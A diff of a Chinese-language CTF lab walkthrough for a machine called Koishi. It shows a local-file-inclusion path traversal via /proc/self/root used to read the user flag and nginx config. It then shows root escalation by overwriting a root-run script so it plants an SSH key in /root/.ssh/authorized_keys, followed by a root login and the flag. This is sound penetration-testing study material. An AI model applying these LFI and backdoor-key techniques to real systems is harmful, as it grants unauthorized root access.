@@ -105,7 +105,7 @@ nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
 利用root文件绕过查找到用户flag
 ?file=/proc/self/root/home/514/user.txt
 
-## 尝试提权到root用户
+尝试提权到root用户
 /?file=/proc/self/root/etc/nginx/http.d/default.conf 
 找到nginx的目录/var/www/localhost
 ```
@@ -230,4 +230,36 @@ while [ $i -le 3 ]; do
     sleep 2
     i=$((i+1))
 done
-修改warning，写入rsa密钥
+修改warning，写入rsa密钥，同时修改proteced，导入warning,记得等一分钟
+```
+cat > /usr/local/bin/warning << 'EOF'
+#!/bin/sh
+mkdir -p /root/.ssh
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9Gl4KbuGTBiFCzlJgJxk8cFx2MxiJf6R0v7QNJUhXkvIBxPSiDNVs1eVjheT23hn671PceSWNffn6vdLRwjDqQ8JW72nNBrkI9bcHtrCOgVQGtp8rotmqXkS5N0A0QZ+syI1w1LF8b0zNuZY+39dgR8HJoKXn7AnJqSoF1wGcdh+CpBfo2zI1ze07GlZXh7A6dUu0Z1dtHgtjpYo5wng2S7AEZMS6rBBl7aqH7CHzo6P2OMNMJonbxLscXKoKnp9g4hNndgqhAwzgCiyVlqqEH/VUQEnZA+P8HgP4WhmSbuwwtKNnxyRRUpsMpmMq6fMc2KAnKrSukpfji8+viXmv root@kali" >> /root/.ssh/authorized_keys
+chmod 600 /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+EOF
+chmod +x /usr/local/bin/warning
+
+mv /home/514/protected/ /home/514/protected.bak
+```
+成功拿下root
+```
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i ~/.ssh/id_rsa root@172.18.105.157
+              _                          
+__      _____| | ___ ___  _ __ ___   ___ 
+\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
+ \ V  V /  __/ | (_| (_) | | | | | |  __/
+  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
+                                         
+Koishi:~# id
+uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+Koishi:~# cat root/root.txt
+cat: can't open 'root/root.txt': No such file or directory
+Koishi:~# ls
+root.txt
+Koishi:~# cat root.txt
+flag{root-7bd5942949d04a7abfa7b9af22704ae2}
+
+```
